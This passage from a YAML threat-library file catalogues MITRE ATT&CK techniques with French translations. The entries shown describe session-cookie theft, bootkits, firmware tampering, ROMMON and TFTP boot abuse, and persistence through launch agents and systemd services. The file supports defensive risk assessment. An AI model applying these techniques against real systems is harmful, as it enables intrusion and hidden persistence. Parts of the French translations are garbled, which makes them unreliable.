          \ de bord de service cloud avec des identifiants vol\xE9s pour obtenir des\
          \ informations utiles issues d\u2019un environnement cloud op\xE9rationnel,\
          \ telles que des services, ressources et fonctionnalit\xE9s sp\xE9cifiques.\
          \ Par exemple, le GCP Command Center peut \xEAtre utilis\xE9 pour visualiser\
          \ tous les actifs, examiner les r\xE9sultats des risques potentiels de s\xE9\
          curit\xE9 et effectuer des requ\xEAtes suppl\xE9mentaires, telles que la\
          \ recherche d\u2019adresses IP publiques et de ports ouverts. (Citation\
          \ : tableau de bord Google Command Center)\n\nSelon la configuration de\
          \ l\u2019environnement, un adversaire peut \xEAtre capable d\u2019\xE9num\xE9\
          rer plus d\u2019informations via le tableau de bord graphique qu\u2019une\
          \ API. Cela permet \xE9galement \xE0 l\u2019adversaire d\u2019obtenir des\
          \ informations sans avoir \xE0 effectuer manuellement de requ\xEAtes d\u2019\
          API.\nhttps://attack.mitre.org/techniques/T1538"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1539
    ref_id: T1539
    name: Steal Web Session Cookie
    description: 'An adversary may steal web application or service session cookies
      and use them to gain access to web applications or Internet services as an authenticated
      user without needing credentials. Web applications and services often use session
      cookies as an authentication token after a user has authenticated to a website.


      Cookies are often valid for an extended period of time, even if the web application
      is not actively used. Cookies can be found on disk, in the process memory of
      the browser, and in network traffic to remote systems. Additionally, other applications
      on the targets machine might store sensitive authentication cookies in memory
      (e.g. apps which authenticate to cloud services). Session cookies can be used
      to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)


      There are several examples of malware targeting cookies from web browsers on
      the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42
      Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting
      malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204)
      by tricking victims into running malicious JavaScript in their browser.(Citation:
      Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)


      There are also open source frameworks such as `Evilginx2` and `Muraena` that
      can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))
      that can be set up by an adversary and used in phishing campaigns.(Citation:
      Github evilginx2)(Citation: GitHub Mauraena)


      After an adversary acquires a valid cookie, they can then perform a [Web Session
      Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to
      the corresponding web application.

      https://attack.mitre.org/techniques/T1539'
    translations:
      fr:
        name: Voler le cookie de session web
        description: "Un adversaire peut voler des cookies d\u2019applications web\
          \ ou de sessions de service et les utiliser pour acc\xE9der \xE0 des applications\
          \ web ou des services Internet en tant qu\u2019utilisateur authentifi\xE9\
          \ sans avoir besoin d\u2019identifiants. Les applications et services web\
          \ utilisent souvent des cookies de session comme jeton d\u2019authentification\
          \ apr\xE8s qu\u2019un utilisateur s\u2019est authentifi\xE9 sur un site\
          \ web.\n\nLes cookies sont souvent valides pendant une longue p\xE9riode,\
          \ m\xEAme si l\u2019application web n\u2019est pas activement utilis\xE9\
          e. Les cookies se trouvent sur le disque, dans la m\xE9moire des processus\
          \ du navigateur, et dans le trafic r\xE9seau vers les syst\xE8mes distants.\
          \ De plus, d\u2019autres applications sur la machine cible peuvent stocker\
          \ des cookies d\u2019authentification sensibles en m\xE9moire (par exemple,\
          \ des applications qui s\u2019authentifient sur des services cloud). Les\
          \ cookies de session peuvent \xEAtre utilis\xE9s pour contourner certains\
          \ protocoles d\u2019authentification multi-facteurs. (Citation : Passe le\
          \ biscuit)\n\nIl existe plusieurs exemples de malwares ciblant les cookies\
          \ depuis des navigateurs web sur le syst\xE8me local. (Citation : Kaspersky\
          \ TajMahal avril 2019)(Citation : Cookies crypto Mac Unit 42 janvier 2019)\
          \ Les adversaires peuvent aussi voler des cookies en injectant du contenu\
          \ JavaScript malveillant dans des sites web ou en s\u2019appuyant sur [User\
          \ Execution](https://attack.mitre.org/techniques/T1204) en trompant les\
          \ victimes pour qu\u2019elles ex\xE9cutent du JavaScript malveillant dans\
          \ leur navigateur. (Citation : Arnaque Talos Roblox 2023)(Citation : Favoris\
          \ Discord Krebs 2023)\n\nIl existe \xE9galement des frameworks open source\
          \ tels que \xAB Evilginx2 \xBB et \xAB Muraena \xBB qui peuvent collecter\
          \ les cookies de session via un proxy malveillant (par exemple, [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))\
          \ qui peut \xEAtre configur\xE9 par un adversaire et utilis\xE9 dans des\
          \ campagnes de phishing. (Citation : Github evilginx2)(Citation : GitHub\
          \ Mauraena)\n\nApr\xE8s qu\u2019un adversaire ait acquis un cookie valide,\
          \ il peut alors effectuer une technique de [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)\
          \ pour se connecter \xE0 l\u2019application web correspondante.\nhttps://attack.mitre.org/techniques/T1539"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542
    ref_id: T1542
    name: Pre-OS Boot
    description: 'Adversaries may abuse Pre-OS Boot mechanisms as a way to establish
      persistence on a system. During the booting process of a computer, firmware
      and various startup services are loaded before the operating system. These programs
      control flow of execution before the operating system takes control.(Citation:
      Wikipedia Booting)


      Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic
      Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to
      persist on systems at a layer below the operating system. This can be particularly
      difficult to detect as malware at this level will not be detected by host software-based
      defenses.

      https://attack.mitre.org/techniques/T1542'
    translations:
      fr:
        name: "D\xE9marrage avant OS"
        description: "Les adversaires peuvent abuser des m\xE9canismes pr\xE9-d\xE9\
          marrage du syst\xE8me d\u2019exploitation comme moyen d\u2019\xE9tablir\
          \ la persistance sur un syst\xE8me. Lors du d\xE9marrage d\u2019un ordinateur,\
          \ le firmware et divers services de d\xE9marrage sont charg\xE9s avant le\
          \ syst\xE8me d\u2019exploitation. Ces programmes contr\xF4lent le flux d\u2019\
          ex\xE9cution avant que le syst\xE8me d\u2019exploitation ne prenne le contr\xF4\
          le. (Citation : d\xE9marrage de Wikip\xE9dia)\n\nLes adversaires peuvent\
          \ \xE9craser les donn\xE9es dans les pilotes de d\xE9marrage ou le firmware\
          \ tels que le BIOS (Basic Input/Output System) et l\u2019Unified Extensible\
          \ Firmware Interface (UEFI) pour qu\u2019elles persistent sur des syst\xE8\
          mes situ\xE9s \xE0 une couche inf\xE9rieure au syst\xE8me d\u2019exploitation.\
          \ Cela peut \xEAtre particuli\xE8rement difficile \xE0 d\xE9tecter car les\
          \ malwares \xE0 ce niveau ne seront pas d\xE9tect\xE9s par les d\xE9fenses\
          \ bas\xE9es sur le logiciel h\xF4te.\nhttps://attack.mitre.org/techniques/T1542"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.001
    ref_id: T1542.001
    name: System Firmware
    description: 'Adversaries may modify system firmware to persist on systems.The
      BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface
      (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware
      that operate as the software interface between the operating system and hardware
      of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation:
      About UEFI)


      System firmware like BIOS and (U)EFI underly the functionality of a computer
      and may be modified by an adversary to perform or assist in malicious activity.
      Capabilities exist to overwrite the system firmware, which may give sophisticated
      adversaries a means to install malicious firmware updates as a means of persistence
      on a system that may be difficult to detect.

      https://attack.mitre.org/techniques/T1542/001'
    translations:
      fr:
        name: "Firmware syst\xE8me"
        description: "Les adversaires peuvent modifier le firmware du syst\xE8me pour\
          \ qu\u2019il persiste sur les syst\xE8mes. Le BIOS (Basic Input/Output System)\
          \ et l\u2019Unified Extensible Firmware Interface (UEFI) ou Extensible Firmware\
          \ Interface (EFI) sont des exemples de micrologiciels syst\xE8me qui fonctionnent\
          \ comme interface logicielle entre le syst\xE8me d\u2019exploitation et\
          \ le mat\xE9riel d\u2019un ordinateur. (Citation : BIOS Wikip\xE9dia)(Citation\
          \ : Wikip\xE9dia UEFI)(Citation : \xC0 propos de l\u2019UEFI)\n\nLe firmware\
          \ syst\xE8me comme le BIOS et (U)EFI sous-tend la fonctionnalit\xE9 d\u2019\
          un ordinateur et peut \xEAtre modifi\xE9 par un adversaire pour effectuer\
          \ ou assister dans des activit\xE9s malveillantes. Il existe des capacit\xE9\
          s permettant d\u2019\xE9craser le firmware syst\xE8me, ce qui peut permettre\
          \ aux adversaires sophistiqu\xE9s d\u2019installer des mises \xE0 jour malveillantes\
          \ du firmware comme moyen de persistance sur un syst\xE8me difficile \xE0\
          \ d\xE9tecter.\nhttps://attack.mitre.org/techniques/T1542/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.002
    ref_id: T1542.002
    name: Component Firmware
    description: 'Adversaries may modify component firmware to persist on systems.
      Some adversaries may employ sophisticated means to compromise computer components
      and install malicious firmware that will execute adversary code outside of the
      operating system and main system firmware or BIOS. This technique may be similar
      to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted
      upon other system components/devices that may not have the same capability or
      level of integrity checking.


      Malicious component firmware could provide both a persistent level of access
      to systems despite potential typical failures to maintain access and hard disk
      re-images, as well as a way to evade host software-based defenses and integrity
      checks.

      https://attack.mitre.org/techniques/T1542/002'
    translations:
      fr:
        name: Firmware des composants
        description: "Les adversaires peuvent modifier le firmware des composants\
          \ pour qu\u2019ils persistent sur les syst\xE8mes. Certains adversaires\
          \ peuvent utiliser des moyens sophistiqu\xE9s pour compromettre des composants\
          \ informatiques et installer des micrologiciels malveillants qui ex\xE9\
          cuteront du code adversaire en dehors du syst\xE8me d\u2019exploitation\
          \ et du firmware principal du syst\xE8me ou du BIOS. Cette technique peut\
          \ \xEAtre similaire au [firmware syst\xE8me](https://attack.mitre.org/techniques/T1542/001)\
          \ mais appliqu\xE9e \xE0 d\u2019autres composants ou dispositifs syst\xE8\
          me qui ne disposent pas du m\xEAme niveau de v\xE9rification d\u2019int\xE9\
          grit\xE9 ou de capacit\xE9 de qualit\xE9.\n\nUn firmware de composants malveillants\
          \ pourrait offrir \xE0 la fois un niveau d\u2019acc\xE8s persistant aux\
          \ syst\xE8mes malgr\xE9 les \xE9checs typiques potentiels de maintien de\
          \ l\u2019acc\xE8s et les r\xE9images de disques durs, ainsi qu\u2019un moyen\
          \ d\u2019\xE9chapper aux d\xE9fenses et contr\xF4les d\u2019int\xE9grit\xE9\
          \ bas\xE9s sur le logiciel h\xF4te.\nhttps://attack.mitre.org/techniques/T1542/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.003
    ref_id: T1542.003
    name: Bootkit
    description: 'Adversaries may use bootkits to persist on systems. A bootkit is
      a malware variant that modifies the boot sectors of a hard drive, allowing malicious
      code to execute before a computer''s operating system has loaded. Bootkits reside
      at a layer below the operating system and may make it difficult to perform full
      remediation unless an organization suspects one was used and can act accordingly.


      In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume
      Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section
      of disk that is first loaded after completing hardware initialization by the
      BIOS. It is the location of the boot loader. An adversary who has raw access
      to the boot drive may overwrite this area, diverting execution during startup
      from the normal boot loader to adversary code.(Citation: Lau 2011)


      The MBR passes control of the boot process to the VBR. Similar to the case of
      MBR, an adversary who has raw access to the boot drive may overwrite the VBR
      to divert execution during startup to adversary code.


      In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead
      create or modify files in the EFI system partition (ESP). The ESP is a partition
      on data storage used by devices containing UEFI that allows the system to boot
      the OS and other utilities used by the system. An adversary can use the newly
      created or patched files in the ESP to run malicious kernel code.(Citation:
      Microsoft Security)(Citation: welivesecurity)

      https://attack.mitre.org/techniques/T1542/003'
    translations:
      fr:
        name: "Kit de d\xE9marrage"
        description: "Les adversaires peuvent utiliser des bootkits pour persister\
          \ sur les syst\xE8mes. Un kit de d\xE9marrage est une variante de malware\
          \ qui modifie les secteurs de d\xE9marrage d\u2019un disque dur, permettant\
          \ \xE0 un code malveillant de s\u2019ex\xE9cuter avant que le syst\xE8me\
          \ d\u2019exploitation d\u2019un ordinateur ne soit charg\xE9. Les kits de\
          \ d\xE9marrage se trouvent \xE0 une couche inf\xE9rieure au syst\xE8me d\u2019\
          exploitation et peuvent rendre difficile la rem\xE9diation compl\xE8te,\
          \ sauf si une organisation soup\xE7onne qu\u2019un mod\xE8le a \xE9t\xE9\
          \ utilis\xE9 et peut agir en cons\xE9quence.\n\nDans les syst\xE8mes BIOS,\
          \ un kit d\u2019amor\xE7age peut modifier l\u2019enregistrement de d\xE9\
          marrage principal (MBR) et/ou l\u2019enregistrement de d\xE9marrage de volume\
          \ (VBR). (Citation : Mandiant M Trends 2016) Le MBR est la section du disque\
          \ qui est charg\xE9e en premier apr\xE8s avoir termin\xE9 l\u2019initialisation\
          \ mat\xE9rielle par le BIOS. C\u2019est l\u2019emplacement du chargeur d\u2019\
          amor\xE7age. Un adversaire ayant un acc\xE8s brut au disque de d\xE9marrage\
          \ peut \xE9craser cette zone, d\xE9tournant l\u2019ex\xE9cution lors du\
          \ d\xE9marrage du chargeur de d\xE9marrage normal vers le code adversaire.\
          \ (Citation : Lau 2011)\n\nLe MBR transmet le contr\xF4le du processus de\
          \ d\xE9marrage au VBR. Similaire au cas du MBR, un adversaire ayant un acc\xE8\
          s brut au disque de d\xE9marrage peut \xE9craser le VBR pour d\xE9tourner\
          \ l\u2019ex\xE9cution lors du d\xE9marrage vers le code adversaire.\n\n\
          Dans les syst\xE8mes UEFI (Unified Extensible Firmware Interface), un kit\
          \ de d\xE9marrage peut \xE0 la place cr\xE9er ou modifier des fichiers dans\
          \ la partition syst\xE8me EFI (ESP). L\u2019ESP est une partition sur le\
          \ stockage de donn\xE9es utilis\xE9e par les appareils contenant UEFI qui\
          \ permet au syst\xE8me de d\xE9marrer le syst\xE8me d\u2019exploitation\
          \ et d\u2019autres utilitaires utilis\xE9s par le syst\xE8me. Un adversaire\
          \ peut utiliser les fichiers nouvellement cr\xE9\xE9s ou corrig\xE9s dans\
          \ l\u2019ESP pour ex\xE9cuter du code malveillant du noyau. (Citation :\
          \ Microsoft Security)(Citation : welivesecurity)\nhttps://attack.mitre.org/techniques/T1542/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.004
    ref_id: T1542.004
    name: ROMMONkit
    description: 'Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized
      firmware with adversary code to provide persistent access and manipulate device
      behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation:
      Cisco Blog Legacy Device Attacks)



      ROMMON is a Cisco network device firmware that functions as a boot loader, boot
      image, or boot helper to initialize hardware and software when the platform
      is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005),
      an adversary may upgrade the ROMMON image locally or remotely (for example,
      through TFTP) with adversary code and restart the device in order to overwrite
      the existing ROMMON image. This provides adversaries with the means to update
      the ROMMON to gain persistence on a system in a way that may be difficult to
      detect.

      https://attack.mitre.org/techniques/T1542/004'
    translations:
      fr:
        name: ROMMONkit
        description: "Les adversaires peuvent abuser du ROM Monitor (ROMMON) en chargeant\
          \ un firmware non autoris\xE9 avec du code adversaire afin d\u2019assurer\
          \ un acc\xE8s persistant et de manipuler un comportement difficile \xE0\
          \ d\xE9tecter sur les appareils. (Citation : Cisco Synful Knock Evolution)(Citation\
          \ : Attaques d\u2019appareils h\xE9rit\xE9s du blog Cisco)\n\nROMMON est\
          \ un firmware de p\xE9riph\xE9rique r\xE9seau Cisco qui fonctionne comme\
          \ chargeur d\u2019amor\xE7age, image de d\xE9marrage ou aide au d\xE9marrage\
          \ pour initialiser le mat\xE9riel et les logiciels lors de l\u2019allumage\
          \ ou r\xE9initialisation de la plateforme. \xC0 l\u2019instar de [TFTP Boot](https://attack.mitre.org/techniques/T1542/005),\
          \ un adversaire peut mettre \xE0 jour l\u2019image ROMMON localement ou\
          \ \xE0 distance (par exemple, via TFTP) avec du code adversaire et red\xE9\
          marrer l\u2019appareil afin de remplacer l\u2019image ROMMON existante.\
          \ Cela permet aux adversaires de mettre \xE0 jour le ROMMON pour obtenir\
          \ de la persistance sur un syst\xE8me d\u2019une mani\xE8re qui peut \xEA\
          tre difficile \xE0 d\xE9tecter.\nhttps://attack.mitre.org/techniques/T1542/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.005
    ref_id: T1542.005
    name: TFTP Boot
    description: 'Adversaries may abuse netbooting to load an unauthorized network
      device operating system from a Trivial File Transfer Protocol (TFTP) server.
      TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled
      network device images from a centralized management server. Netbooting is one
      option in the boot sequence and can be used to centralize, manage, and control
      device images.


      Adversaries may manipulate the configuration on the network device specifying
      use of a malicious TFTP server, which may be used in conjunction with [Modify
      System Image](https://attack.mitre.org/techniques/T1601) to load a modified
      image on device startup or reset. The unauthorized image allows adversaries
      to modify device configuration, add malicious capabilities to the device, and
      introduce backdoors to maintain control of the network device while minimizing
      detection through use of a standard functionality. This technique is similar
      to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result
      in the network device running a modified image. (Citation: Cisco Blog Legacy
      Device Attacks)

      https://attack.mitre.org/techniques/T1542/005'
    translations:
      fr:
        name: "D\xE9marrage TFTP"
        description: "Les adversaires peuvent abuser du netboot pour charger un syst\xE8\
          me d\u2019exploitation de p\xE9riph\xE9rique r\xE9seau non autoris\xE9 depuis\
          \ un serveur du Trivial File Transfer Protocol (TFTP). Le d\xE9marrage TFTP\
          \ (netbooting) est couramment utilis\xE9 par les administrateurs r\xE9seau\
          \ pour charger des images de dispositifs r\xE9seau contr\xF4l\xE9es par\
          \ la configuration depuis un serveur de gestion centralis\xE9. Le netboot\
          \ est une option dans la s\xE9quence de d\xE9marrage et peut \xEAtre utilis\xE9\
          \ pour centraliser, g\xE9rer et contr\xF4ler les images des appareils.\n\
          \nLes adversaires peuvent manipuler la configuration sur l\u2019appareil\
          \ r\xE9seau en sp\xE9cifiant l\u2019utilisation d\u2019un serveur TFTP malveillant,\
          \ qui peut \xEAtre utilis\xE9 en conjonction avec [Modifier image syst\xE8\
          me](https://attack.mitre.org/techniques/T1601) pour charger une image modifi\xE9\
          e au d\xE9marrage ou \xE0 la r\xE9initialisation de l\u2019appareil. L\u2019\
          image non autoris\xE9e permet aux adversaires de modifier la configuration\
          \ des appareils, d\u2019ajouter des capacit\xE9s malveillantes \xE0 l\u2019\
          appareil et d\u2019introduire des portes d\xE9rob\xE9es pour maintenir le\
          \ contr\xF4le du dispositif r\xE9seau tout en minimisant la d\xE9tection\
          \ gr\xE2ce \xE0 une fonctionnalit\xE9 standard. Cette technique est similaire\
          \ \xE0 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) et peut\
          \ entra\xEEner l\u2019ex\xE9cution d\u2019une image modifi\xE9e par le dispositif\
          \ r\xE9seau. (Citation : Attaques d\u2019appareils h\xE9rit\xE9s du blog\
          \ Cisco)\nhttps://attack.mitre.org/techniques/T1542/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543
    ref_id: T1543
    name: Create or Modify System Process
    description: "Adversaries may create or modify system-level processes to repeatedly\
      \ execute malicious payloads as part of persistence. When operating systems\
      \ boot up, they can start processes that perform background system functions.\
      \ On Windows and Linux, these system processes are referred to as services.(Citation:\
      \ TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run\
      \ to finish system initialization and load user specific parameters.(Citation:\
      \ AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services,\
      \ daemons, or agents that can be configured to execute at startup or a repeatable\
      \ interval in order to establish persistence. Similarly, adversaries may modify\
      \ existing services, daemons, or agents to achieve the same effect.  \n\nServices,\
      \ daemons, or agents may be created with administrator privileges but executed\
      \ under root/SYSTEM privileges. Adversaries may leverage this functionality\
      \ to create or modify system processes in order to escalate privileges.(Citation:\
      \ OSX Malware Detection)"
    translations:
      fr:
        name: "Cr\xE9er ou modifier un processus syst\xE8me"
        description: "Les adversaires peuvent cr\xE9er ou modifier des processus au\
          \ niveau syst\xE8me pour ex\xE9cuter \xE0 plusieurs reprises des charges\
          \ utiles malveillantes dans le cadre de la persistance. Lorsque les syst\xE8\
          mes d\u2019exploitation d\xE9marrent, ils peuvent lancer des processus qui\
          \ ex\xE9cutent des fonctions syst\xE8me en arri\xE8re-plan. Sous Windows\
          \ et Linux, ces processus syst\xE8me sont appel\xE9s services. (Citation\
          \ : TechNet Services) Sur macOS, des processus lanc\xE9s appel\xE9s [Launch\
          \ Daemon](https://attack.mitre.org/techniques/T1543/004) et [Launch Agent](https://attack.mitre.org/techniques/T1543/001)\
          \ sont ex\xE9cut\xE9s pour finaliser l\u2019initialisation du syst\xE8me\
          \ et charger des param\xE8tres sp\xE9cifiques \xE0 l\u2019utilisateur. (Citation\
          \ : Agent de lancement AppleDocs Daemons) \n\nLes adversaires peuvent installer\
          \ de nouveaux services, d\xE9mons ou agents qui peuvent \xEAtre configur\xE9\
          s pour s\u2019ex\xE9cuter au d\xE9marrage ou \xE0 un intervalle r\xE9p\xE9\
          table afin d\u2019\xE9tablir la persistance. De m\xEAme, les adversaires\
          \ peuvent modifier des services, d\xE9mons ou agents existants pour obtenir\
          \ le m\xEAme effet.  \n\nLes services, d\xE9mons ou agents peuvent \xEA\
          tre cr\xE9\xE9s avec des privil\xE8ges administrateur mais ex\xE9cut\xE9\
          s sous des privil\xE8ges root/SYSTEM. Les adversaires peuvent exploiter\
          \ cette fonctionnalit\xE9 pour cr\xE9er ou modifier des processus syst\xE8\
          me afin d\u2019escalader les privil\xE8ges. (Citation : D\xE9tection de\
          \ logiciels malveillants OSX)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.001
    ref_id: T1543.001
    name: Launch Agent
    description: "Adversaries may create or modify launch agents to repeatedly execute\
      \ malicious payloads as part of persistence. When a user logs in, a per-user\
      \ launchd process is started which loads the parameters for each launch-on-demand\
      \ user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>,\
      \ <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation:\
      \ AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation:\
      \ Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments\
      \ </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name,\
      \ executable location, and execution time.(Citation: OSX.Dok Malware) Launch\
      \ Agents are often installed to perform updates to programs, launch user specified\
      \ programs at login, or to conduct other developer tasks.\n\n Launch Agents\
      \ can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001)\
      \ command.\n \nAdversaries may install a new Launch Agent that executes at login\
      \ by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code>\
      \ or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy\
      \ Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent\
      \ name may be disguised by using a name from the related operating system or\
      \ benign software. Launch Agents are created with user level privileges and\
      \ execute with user level permissions.(Citation: OSX Malware Detection)(Citation:\
      \ OceanLotus for OS X)\nhttps://attack.mitre.org/techniques/T1543/001"
    translations:
      fr:
        name: Agent de lancement
        description: "Les adversaires peuvent cr\xE9er ou modifier des agents de lancement\
          \ pour ex\xE9cuter \xE0 r\xE9p\xE9tition des charges utiles malveillantes\
          \ dans le cadre de la persistance. Lorsqu\u2019un utilisateur se connecte,\
          \ un processus lanc\xE9 par utilisateur est lanc\xE9 et charge les param\xE8\
          tres de chaque agent utilisateur \xE0 la demande \xE0 partir du fichier\
          \ de liste de propri\xE9t\xE9s (.plist) trouv\xE9 dans <code>/System/Library/LaunchAgents</code>,\
          \ <code>/Library/LaunchAgents</code> et <code>~/Library/LaunchAgents</code>.\
          \ (Citation : Agent de lancement AppleDocs Daemons)(Citation : malware OSX\
          \ Keydnap) (Citation : Malware Mac d\xE9su\xE8te) Les fichiers de liste\
          \ de propri\xE9t\xE9s utilisent les cl\xE9s <code>Label</code>, <code>ProgramArguments\
          \ </code>et <code>RunAtLoad</code> pour identifier le nom de l\u2019agent\
          \ de lancement, l\u2019emplacement de l\u2019ex\xE9cutable et le temps d\u2019\
          ex\xE9cution. (Citation : OSX. Dok Malware) Les agents de lancement sont\
          \ souvent install\xE9s pour effectuer des mises \xE0 jour des programmes,\
          \ lancer les programmes sp\xE9cifi\xE9s par l\u2019utilisateur lors de la\
          \ connexion, ou pour effectuer d\u2019autres t\xE2ches de d\xE9veloppement.\n\
          \nLes agents de lancement peuvent \xE9galement \xEAtre ex\xE9cut\xE9s via\
          \ la commande [Launchctl](https://attack.mitre.org/techniques/T1569/001).\n\
          \ \nLes adversaires peuvent installer un nouvel Agent de lancement qui s\u2019\
          ex\xE9cute \xE0 la connexion en pla\xE7ant un fichier .plist dans les dossiers\
          \ appropri\xE9s avec les touches <code>RunAtLoad</code> ou <code>KeepAlive</code>\
          \ r\xE9gl\xE9es sur <code>true</code>. (Citation : Sofacy Komplex Trojan)(Citation\
          \ : M\xE9thodes de persistance des malwares Mac) Le nom de l\u2019agent\
          \ de lancement peut \xEAtre d\xE9guis\xE9 en utilisant un nom provenant\
          \ du syst\xE8me d\u2019exploitation associ\xE9 ou d\u2019un logiciel inoffensif.\
          \ Les Agents de lancement sont cr\xE9\xE9s avec des privil\xE8ges au niveau\
          \ utilisateur et s\u2019ex\xE9cutent avec des permissions au niveau utilisateur.\
          \ (Citation : D\xE9tection de logiciels malveillants OSX)(Citation : OceanLotus\
          \ pour OS X)\nhttps://attack.mitre.org/techniques/T1543/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.002
    ref_id: T1543.002
    name: Systemd Service
    description: "Adversaries may create or modify systemd services to repeatedly\
      \ execute malicious payloads as part of persistence. Systemd is a system and\
      \ service manager commonly used for managing background daemon processes (also\
      \ known as services) and other system resources.(Citation: Linux man-pages:\
      \ systemd January 2014) Systemd is the default initialization (init) system\
      \ on many Linux distributions replacing legacy init systems, including SysVinit\
      \ and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit\
      \ configuration files with the `.service` file extension to encode information\
      \ about a service's process. By default, system level unit files are stored\
      \ in the `/systemd/system` directory of the root owned directories (`/`). User\
      \ level unit files are stored in the `/systemd/user` directories of the user\
      \ owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the\
      \ `.service` unit files, the following directives are used to execute commands:(Citation:\
      \ freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost`\
      \ directives execute when a service is started manually by `systemctl` or on\
      \ system start if the service is set to automatically start.\n* `ExecReload`\
      \ directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`,\
      \ and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries\
      \ have created new service files, altered the commands a `.service` file\u2019\
      s directive executes, and modified the user directive a `.service` file executes\
      \ as, which could result in privilege escalation. Adversaries may also place\
      \ symbolic links in these directories, enabling systemd to find these payloads\
      \ regardless of where they reside on the filesystem.(Citation: Anomali Rocke\
      \ March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service\
      \ Persistence 22JUNE2016) \n\nThe `.service` file\u2019s User directive can\
      \ be used to run service as a specific user, which could result in privilege\
      \ escalation based on specific user/group permissions. \n\nSystemd services\
      \ can be created via systemd generators, which support the dynamic generation\
      \ of unit files. Systemd generators are small executables that run during boot\
      \ or configuration reloads to dynamically create or modify systemd unit files\
      \ by converting non-native configurations into services, symlinks, or drop-ins\
      \ (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation:\
      \ Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd\
      \ 2022)\nhttps://attack.mitre.org/techniques/T1543/002"
    translations:
      fr:
        name: Systemd Service
        description: "Les adversaires peuvent cr\xE9er ou modifier des services syst\xE9\
          miques pour ex\xE9cuter \xE0 plusieurs reprises des charges utiles malveillantes\
          \ dans le cadre de la persistance. Systemd est un gestionnaire de syst\xE8\
          mes et de services couramment utilis\xE9 pour g\xE9rer les processus d\xE9\
          moniaques en arri\xE8re-plan (\xE9galement appel\xE9s services) et d\u2019\
          autres ressources syst\xE8me. (Citation : Linux man-pages : systemd janvier\
          \ 2014) Systemd est le syst\xE8me d\u2019initialisation par d\xE9faut (init)\
          \ sur de nombreuses distributions Linux, rempla\xE7ant les syst\xE8mes init\
          \ h\xE9rit\xE9s, y compris SysVinit et Upstart, tout en restant r\xE9trocompatible.\
          \  \n\nSystemd utilise des fichiers de configuration unitaires avec l\u2019\
          extension de fichier '.service' pour encoder des informations sur le processus\
          \ d\u2019un service. Par d\xE9faut, les fichiers d\u2019unit\xE9s au niveau\
          \ syst\xE8me sont stock\xE9s dans le r\xE9pertoire '/systemd/system' des\
          \ r\xE9pertoires appartenant \xE0 la racine ('/'). Les fichiers d\u2019\
          unit\xE9s au niveau utilisateur sont stock\xE9s dans les annuaires \xAB\
          \ /systemd/user \xBB des annuaires appartenant \xE0 l\u2019utilisateur ('$HOME').\
          \ (Citation : lambert systemd 2022) \n\nDans les fichiers d\u2019unit\xE9\
          \ '.service', les directives suivantes sont utilis\xE9es pour ex\xE9cuter\
          \ les commandes : (Citation : freedesktop systemd.service)  \n\n* Les directives\
          \ 'ExecStart', 'ExecStartPre' et 'ExecStartPost' s\u2019ex\xE9cutent lorsqu\u2019\
          un service est lanc\xE9 manuellement par 'systemctl' ou au d\xE9marrage\
          \ du syst\xE8me si le service est configur\xE9 pour d\xE9marrer automatiquement.\n\
          * La directive 'ExecReload' s\u2019ex\xE9cute lorsqu\u2019un service red\xE9\
          marre. \n* Les directives \xAB ExecStop \xBB, \xAB ExecStopPre \xBB et \xAB\
